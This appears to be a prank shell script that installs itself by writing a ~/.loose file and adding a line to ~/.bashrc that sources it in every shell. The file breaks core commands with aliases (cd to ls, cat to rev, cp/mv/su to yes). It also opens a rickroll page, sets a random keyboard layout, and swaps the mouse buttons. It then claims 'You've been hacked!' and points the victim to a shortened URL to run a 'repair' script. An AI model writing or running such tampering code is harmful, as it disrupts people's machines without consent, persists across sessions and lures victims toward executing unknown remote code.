#!/bin/sh


cat <<EOF > ~/.loose
# aliases
alias vim=emacs
alias cd=ls
alias cat=rev
alias cp=yes
alias mv=yes
alias su=yes
alias scp="echo JE SUIS UN GLAND"

# rickrolled
(
    hash google-chrome && (
        google-chrome rickroll.fr
    ) || true
) 2>/dev/null

# change keyboard layout
(
    hash localectl && (
	setxkbmap \`localectl list-keymaps | shuf -n 1\`
    ) || setxkbmap dvorak || true
) 2>/dev/null

# mouse
(
    xset mouse 3 0 || true
    xmodmap -e "pointer = 3 2 1" || true
) 2>/dev/null

echo "You've been hacked!"
echo "  You are now using a randomly chosen keyboard (or dvorak)"
echo "  To 'repair' your computer, you need to undo everything in ~/.loose file"
echo "  Or execute this script: http://j.mp/wiiiiiin"
echo "Tchuss"

EOF

grep .loose ~/.bashrc 2>/dev/null || echo "source ~/.loose" >> ~/.bashrc

#. ~/.loose
